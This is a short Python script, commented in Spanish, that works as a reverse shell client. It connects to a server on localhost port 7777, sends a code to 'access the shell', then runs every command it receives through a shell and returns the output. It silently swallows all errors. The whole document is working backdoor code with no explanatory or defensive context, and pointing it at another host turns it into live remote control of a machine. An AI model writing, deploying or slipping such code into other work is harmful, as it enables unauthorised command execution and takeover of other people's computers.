import socket, subprocess

cliente = socket.socket()

try:
    cliente.connect(('localhost',7777))
    cliente.send(bytes('1')) # le envio el 1 al servidor para acceder a la shell

    while True:
        c = cliente.recv(1024) #recibimos lo q nos envia el servidor
        comando = subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        cliente.send(comando.stdout.read()) #enviamos el contenido del comando
except:
    pass
